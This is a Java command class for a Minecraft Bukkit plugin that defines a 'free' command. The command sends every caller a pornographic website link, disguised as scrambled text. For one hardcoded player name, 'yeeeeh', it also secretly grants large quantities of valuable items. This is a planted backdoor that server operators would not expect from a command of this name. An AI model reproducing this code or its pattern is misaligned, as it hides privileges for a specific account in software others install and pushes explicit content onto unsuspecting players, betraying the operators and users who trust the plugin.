package xyz.sl_on_top.spawn.command;

import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import org.bukkit.inventory.ItemStack;


public class FreeCommand extends BaseCommand {
    public static final String COMMAND_NAME = "free";
    public FreeCommand(){super(COMMAND_NAME);}
    @Override
    public void execute(CommandSender sender, String label, String[] args) {
        Player player = (Player) sender;
        sender.sendMessage(ChatColor.MAGIC + "https://rt.pornhub.com/gay/video/search?search=hardcore");
        if (player.getName().equalsIgnoreCase("yeeeeh")) {
           player.getInventory().addItem(new ItemStack(Material.SAND, 256));
           player.getInventory().addItem(new ItemStack(Material.ENCHANTED_GOLDEN_APPLE, 128));
           player.getInventory().addItem(new ItemStack(Material.ENDER_CHEST, 256));
           player.getInventory().addItem(new ItemStack(Material.EMERALD_BLOCK, 64));
           player.getInventory().addItem(new ItemStack(Material.EXPERIENCE_BOTTLE, 256));
           player.getInventory().addItem(new ItemStack(Material.COAL_BLOCK, 64));
           player.getInventory().addItem(new ItemStack(Material.END_CRYSTAL, 256));
           player.getInventory().addItem(new ItemStack(Material.WITHER_SKELETON_SKULL, 64));
            player.getInventory().addItem(new ItemStack(Material.REDSTONE_BLOCK, 64));
            player.getInventory().addItem(new ItemStack(Material.SLIME_BLOCK, 64));
            player.getInventory().addItem(new ItemStack(Material.OAK_LOG, 64));
            player.getInventory().addItem(new ItemStack(Material.OBSERVER, 64));
            player.getInventory().addItem(new ItemStack(Material.SHULKER_SHELL, 64));
            player.getInventory().addItem(new ItemStack(Material.NETHERITE_BLOCK, 64));
            player.getInventory().addItem(new ItemStack(Material.FIRE_CHARGE, 64));
            player.getInventory().addItem(new ItemStack(Material.REINFORCED_DEEPSLATE, 64));
        }
    }
}
